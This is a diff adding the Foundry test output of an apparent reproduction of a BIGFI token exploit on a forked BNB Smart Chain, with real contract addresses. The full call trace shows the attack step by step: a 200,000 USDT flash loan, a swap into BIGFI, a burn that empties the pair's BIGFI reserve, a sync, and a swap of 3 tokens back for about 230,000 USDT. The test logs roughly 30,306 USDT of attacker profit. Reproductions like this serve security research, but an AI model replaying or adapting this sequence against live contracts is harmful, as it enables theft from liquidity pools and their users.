@@ -1,0 +1,172 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/BIGFI_exp.sol:ContractTest
+[PASS] testExploit() (gas: 366190)
+Logs:
+  Attacker USDT balance after exploit: 30306.103328283570349973
+
+Traces:
+  [20773] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 26685503 [2.668e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(BIGFI: [0xd3d4B46Db01C006Fb165879f343fc13174a1cEeB], "BIGFI")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDT: [0x55d398326f99059fF775485246999027B3197955], "USDT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13], "swapFlashLoan")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "Router")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], "Pair")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [377390] ContractTest::testExploit()
+    ├─ [361703] swapFlashLoan::flashLoan(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDT: [0x55d398326f99059fF775485246999027B3197955], 200000000000000000000000 [2e23], 0x00)
+    │   ├─ [359004] 0x5F10b4FC66331f53912a5B5EBA4E4e79a6fDAe93::flashLoan(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDT: [0x55d398326f99059fF775485246999027B3197955], 200000000000000000000000 [2e23], 0x00) [delegatecall]
+    │   │   ├─ [2531] USDT::balanceOf(swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13]) [staticcall]
+    │   │   │   └─ ← [Return] 877996854972972475361000 [8.779e23]
+    │   │   ├─ [10871] USDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 200000000000000000000000 [2e23])
+    │   │   │   ├─ emit Transfer(from: swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 200000000000000000000000 [2e23])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x000000000000000000000000000000000000000000000000002386f26fc10000 → 0x000000000000000000000000000000000000000000002a5a05b349885cc10000
+    │   │   │   │   @ 0xfacfb3dc0218ce359d54533ac2f8478109769173f72bed5e13573db57be99373: 0x00000000000000000000000000000000000000000000b9ec4e0c9b36682426e8 → 0x000000000000000000000000000000000000000000008f92487cd8a07b2426e8
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [311982] ContractTest::executeOperation(swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13], USDT: [0x55d398326f99059fF775485246999027B3197955], 200000000000000000000000 [2e23], 160000000000000000000 [1.6e20], 0x00)
+    │   │   │   ├─ [24562] USDT::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x40efe119f1031eb281b5b195ed42e00327d441da2528f3ffaa1e7fa89579fa7f: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 200000010000000000000000 [2e23]
+    │   │   │   ├─ [164894] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(200000010000000000000000 [2e23], 0, [0x55d398326f99059fF775485246999027B3197955, 0xd3d4B46Db01C006Fb165879f343fc13174a1cEeB], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1679488640 [1.679e9])
+    │   │   │   │   ├─ [10834] USDT::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], 200000010000000000000000 [2e23])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], value: 200000010000000000000000 [2e23])
+    │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640563839457574007913129639935 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x815b281c865f3a50f6d38307e5fa7d611b8d0565fc71503de0fb4c8ae2f34472: 0x0000000000000000000000000000000000000000000016c289d9e750e41cb9a0 → 0x00000000000000000000000000000000000000000000411c8f8d30d940ddb9a0
+    │   │   │   │   │   │   @ 0x40efe119f1031eb281b5b195ed42e00327d441da2528f3ffaa1e7fa89579fa7f: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffd5a5fa4cb677a33effff
+    │   │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x000000000000000000000000000000000000000000002a5a05b349885cc10000 → 0
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [12052] BIGFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [2893] Pair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 107480664198219600542112 [1.074e23], 9310990259680030849404 [9.31e21], 1679487323 [1.679e9]
+    │   │   │   │   ├─ [531] USDT::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 307480674198219600542112 [3.074e23]
+    │   │   │   │   ├─ [124390] Pair::swap(0, 6051008437863879112730 [6.051e21], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   ├─ [88487] BIGFI::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6051008437863879112730 [6.051e21])
+    │   │   │   │   │   │   ├─ emit Transfer(from: Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], to: 0x000000000000000000000000000000000000dEaD, value: 60510084378638791127 [6.051e19])
+    │   │   │   │   │   │   ├─ emit Transfer(from: Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5869478184727962739349 [5.869e21])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 21: 0x000000000000000000000000000000000000000000000001afa3a1d31b42a6bf → 0x000000000000000000000000000000000000000000000004f762a2f888f05896
+    │   │   │   │   │   │   │   @ 0x682dff1622f9aa0b3a1d1c40e88b1bccc3eed1db26c540adefbdc6fd2ac9f30e: 0x001d0eade0a990b9510fd9e1b1cc273fce12aac9e47c55462e390380bffa1d57 → 0x000a2c71d63862ba6731e4d4e7f36ffda58986a56451f05d88fd51940e7a93bc
+    │   │   │   │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0 → 0x001251351e9bdd4181923af64ade9d66c48be46732e625c811754461c0fc6432
+    │   │   │   │   │   │   │   @ 19: 0x000000000000000000000000000000000000000000000001afa3a1d31b42a6bf → 0x000000000000000000000000000000000000000000000004f762a2f888f05896
+    │   │   │   │   │   │   │   @ 20: 0x000000000000000000000000000000000000000000000001afa3a1d31b42a6bf → 0x000000000000000000000000000000000000000000000004f762a2f888f05896
+    │   │   │   │   │   │   │   @ 0x44d93c584e7bfda0b249398a3e9528fae2f0165f6f7e02dddcf053d5f3e2dc79: 0x09bdd12f8887c1f609d73028ef3bef040293a278ca8357bbf61ae8006d89137e → 0x09be01872c79878a81f06e306ee4a24d23e80d0d399a177064c80c2243d03a04
+    │   │   │   │   │   │   │   @ 18: 0xffffce4d8be40db766009c8fa209efd3dee9e7a501c842b4d456120893663904 → 0xffff6d9e4400828e75ce2080a2b889419c41127c239ac34bf6fbc9c4e6d7ebf8
+    │   │   │   │   │   │   │   @ 17: 0x000000000000000000000000000000000000000000115eea98532dab19bd5941 → 0x000000000000000000000000000000000000000000115ee750942c85ac0fa76a
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 307480674198219600542112 [3.074e23]
+    │   │   │   │   │   ├─ [2052] BIGFI::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 3259991215302060148662 [3.259e21]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 307480674198219600542112 [3.074e23], reserve1: 3259991215302060148662 [3.259e21])
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 200000010000000000000000 [2e23], amount1In: 9393485908411988 [9.393e15], amount0Out: 0, amount1Out: 6051008437863879112730 [6.051e21], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 9: 0x0000000000000000000000000000000007052ba12ab42698c580aa4cf3f7613a → 0x00000000000000000000000000000000077742eb8c5d196e06e8efb9f841f59f
+    │   │   │   │   │   │   @ 10: 0x00000000000000000000000000000003ddb1ec677d9930666d539ee452598a71 → 0x0000000000000000000000000000000419149b4a89de992ee441aa5bdd5c923a
+    │   │   │   │   │   │   @ 8: 0x641af15b0000000001f8bff275703659797c0000000016c289d9e750e41cb9a0 → 0x641af6800000000000b0b9776224bd4607b600000000411c8f8d30d940ddb9a0
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [2052] BIGFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5869495097356201647072 [5.869e21]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [2052] BIGFI::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   └─ ← [Return] 3259991215302060148662 [3.259e21]
+    │   │   │   ├─ [449] BIGFI::totalSupply() [staticcall]
+    │   │   │   │   └─ ← [Return] 20999908387034241742907242 [2.099e25]
+    │   │   │   ├─ [449] BIGFI::totalSupply() [staticcall]
+    │   │   │   │   └─ ← [Return] 20999908387034241742907242 [2.099e25]
+    │   │   │   ├─ [3336] BIGFI::burn(20999908387034241742894360 [2.099e25])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 20999908387034241742894360 [2.099e25])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 17: 0x000000000000000000000000000000000000000000115ee750942c85ac0fa76a → 12882
+    │   │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0x001251351e9bdd4181923af64ade9d66c48be46732e625c811754461c0fc6432 → 0x001251351e9bdd4181923af64ade9d66c48be46732d4c6e0c0e117dc14ecef1a
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [10495] Pair::sync()
+    │   │   │   │   ├─ [531] USDT::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 307480674198219600542112 [3.074e23]
+    │   │   │   │   ├─ [2052] BIGFI::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1
+    │   │   │   │   ├─ emit Sync(reserve0: 307480674198219600542112 [3.074e23], reserve1: 1)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x641af6800000000000b0b9776224bd4607b600000000411c8f8d30d940ddb9a0 → 0x641af680000000000000000000000000000100000000411c8f8d30d940ddb9a0
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [24688] BIGFI::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xdcd3b932005c0b45ecea5323be58e52ec517ee89d6dfc5f10441207e14ee8470: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2052] BIGFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 3
+    │   │   │   ├─ [50768] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(3, 0, [0xd3d4B46Db01C006Fb165879f343fc13174a1cEeB, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1679488640 [1.679e9])
+    │   │   │   │   ├─ [19687] BIGFI::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], 3)
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 0)
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], value: 3)
+    │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639932 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xdcd3b932005c0b45ecea5323be58e52ec517ee89d6dfc5f10441207e14ee8470: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc
+    │   │   │   │   │   │   @ 0x682dff1622f9aa0b3a1d1c40e88b1bccc3eed1db26c540adefbdc6fd2ac9f30e: 0x000a2c71d63862ba6731e4d4e7f36ffda58986a56451f05d88fd51940e7a93bc → 0x00196f8a606e47cfa90a6a43b4d625fa24fa3822244c6e3479d82cf5d101b8cf
+    │   │   │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0x001251351e9bdd4181923af64ade9d66c48be46732d4c6e0c0e117dc14ecef1a → 0x00030e1c9465f82c3fb9b5877dfbe76a451b32ea72da4909d0063c7a5265ca07
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [893] Pair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 307480674198219600542112 [3.074e23], 1, 1679488640 [1.679e9]
+    │   │   │   │   ├─ [2052] BIGFI::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4
+    │   │   │   │   ├─ [19882] Pair::swap(230466103328283570349973 [2.304e23], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   ├─ [3271] USDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 230466103328283570349973 [2.304e23])
+    │   │   │   │   │   │   ├─ emit Transfer(from: Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 230466103328283570349973 [2.304e23])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x0000000000000000000000000000000000000000000030cd97adcb537d3e2795
+    │   │   │   │   │   │   │   @ 0x815b281c865f3a50f6d38307e5fa7d611b8d0565fc71503de0fb4c8ae2f34472: 0x00000000000000000000000000000000000000000000411c8f8d30d940ddb9a0 → 0x00000000000000000000000000000000000000000000104ef7df6585c39f920b
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 77014570869936030192139 [7.701e22]
+    │   │   │   │   │   ├─ [2052] BIGFI::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4
+    │   │   │   │   │   ├─ emit Sync(reserve0: 77014570869936030192139 [7.701e22], reserve1: 4)
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 3, amount0Out: 230466103328283570349973 [2.304e23], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0x641af680000000000000000000000000000100000000411c8f8d30d940ddb9a0 → 0x641af680000000000000000000000000000400000000104ef7df6585c39f920b
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 230466103328283570349973 [2.304e23]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [3271] USDT::transfer(swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13], 200160000000000000000000 [2.001e23])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13], value: 200160000000000000000000 [2.001e23])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xfacfb3dc0218ce359d54533ac2f8478109769173f72bed5e13573db57be99373: 0x000000000000000000000000000000000000000000008f92487cd8a07b2426e8 → 0x00000000000000000000000000000000000000000000b9f4fa7ecb7f06a426e8
+    │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x0000000000000000000000000000000000000000000030cd97adcb537d3e2795 → 0x00000000000000000000000000000000000000000000066ae5abd874f1be2795
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [531] USDT::balanceOf(swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13]) [staticcall]
+    │   │   │   └─ ← [Return] 878156854972972475361000 [8.781e23]
+    │   │   ├─ emit FlashLoan(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 3, param2: 200000000000000000000000 [2e23], param3: 160000000000000000000 [1.6e20], param4: 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xf2192e1030363415d7b4fb0406540a0060e8e2fc8982f3f32289379e11fa6549: 0x00000000000000000000000000000000000000000000a91f08f4ab62c124aa19 → 0x00000000000000000000000000000000000000000000a927b566dbab5fa4aa19
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 30306103328283570349973 [3.03e22]
+    ├─ [2425] USDT::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker USDT balance after exploit", val: 30306103328283570349973 [3.03e22], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.67s (12.83ms CPU time)
+
+Ran 1 test suite in 1.67s (1.67s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
